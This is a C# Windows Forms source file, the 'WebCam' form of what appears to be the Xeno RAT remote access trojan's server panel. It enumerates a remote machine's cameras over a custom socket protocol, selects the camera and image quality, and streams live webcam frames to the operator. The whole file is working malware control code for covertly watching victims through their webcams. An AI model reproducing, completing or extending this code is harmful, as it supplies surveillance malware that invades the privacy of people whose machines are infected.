using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class WebCam : Form
    {
        private readonly Node client;
        private Node ImageNode;
        private bool playing = false;
        private readonly string[] qualitys = { "100%", "90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };

        public WebCam(Node _client)
        {
            client = _client;
            InitializeComponent();
            client.AddTempOnDisconnect(TempOnDisconnect);
            comboBox2.Items.AddRange(qualitys);
            InitializeAsync();
        }

        private async void InitializeAsync()
        {
            ImageNode = await CreateImageNode();
            ImageNode.AddTempOnDisconnect(TempOnDisconnect);
            await RefreshCams();
            _ = Task.Run(RecvThread);
        }

        private async Task RecvThread()
        {
            while (ImageNode.Connected())
            {
                byte[] data = await ImageNode.ReceiveAsync();
                if (data == null)
                    break;

                if (playing)
                {
                    try
                    {
                        using (MemoryStream ms = new MemoryStream(data))
                        {
                            Image image = Image.FromStream(ms);
                            pictureBox1.BeginInvoke((Action)(() =>
                            {
                                pictureBox1.Image?.Dispose();
                                pictureBox1.Image = image;
                            }));
                        }
                    }
                    catch { }
                }
            }
        }

        private async Task RefreshCams()
        {
            string[] cameras = await GetCamera();
            comboBox1.Items.Clear();
            comboBox1.Items.AddRange(cameras);

            button2.Enabled = cameras.Length > 0;
            if (cameras.Length > 0)
                await SetCamera(0);
        }

        private async Task SetCamera(int index)
        {
            await client.SendAsync(new byte[] { 1 });
            await client.SendAsync(client.sock.IntToBytes(index));
        }

        private async Task SetQuality(int quality)
        {
            await client.SendAsync(new byte[] { 5 });
            await client.SendAsync(client.sock.IntToBytes(quality));
        }

        private async Task<string[]> GetCamera()
        {
            await client.SendAsync(new byte[] { 0 });
            int mics = client.sock.BytesToInt(await client.ReceiveAsync());
            string[] result = new string[mics];

            for (int i = 0; i < mics; i++)
                result[i] = Encoding.UTF8.GetString(await client.ReceiveAsync());

            return result;
        }

        private void TempOnDisconnect(Node node)
        {
            if (node == client || (node == ImageNode && ImageNode != null))
            {
                client?.Disconnect();
                ImageNode?.Disconnect();
                if (!IsDisposed)
                    BeginInvoke((Action)(() => Close()));
            }
        }

        private async Task<Node> CreateImageNode()
        {
            if (ImageNode != null)
                return ImageNode;

            await client.SendAsync(new byte[] { 4 });
            Node subSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(subSubNode);

            if (id != -1)
            {
                await Utils.Type2returnAsync(subSubNode);
                await client.SendAsync(subSubNode.sock.IntToBytes(id));
                byte[] found = await client.ReceiveAsync();

                if (found == null || found[0] == 0)
                {
                    subSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                subSubNode.Disconnect();
                return null;
            }

            return subSubNode;
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            button3.Enabled = true;
            button2.Enabled = false;
            button1.Enabled = false;
            await client.SendAsync(new byte[] { 2 });
            playing = true;
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            button2.Enabled = true;
            button3.Enabled = false;
            button1.Enabled = true;
            await client.SendAsync(new byte[] { 3 });
            playing = false;
            pictureBox1.Image?.Dispose();
            pictureBox1.Image = null;
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            await RefreshCams();
        }

        private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox1.SelectedIndex;
            if (selectedIndex != -1)
                await SetCamera(selectedIndex);
        }

        private async void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox2.SelectedIndex;
            if (selectedIndex != -1)
                await SetQuality(int.Parse(qualitys[selectedIndex].Replace("%", "")));
        }
    }
}
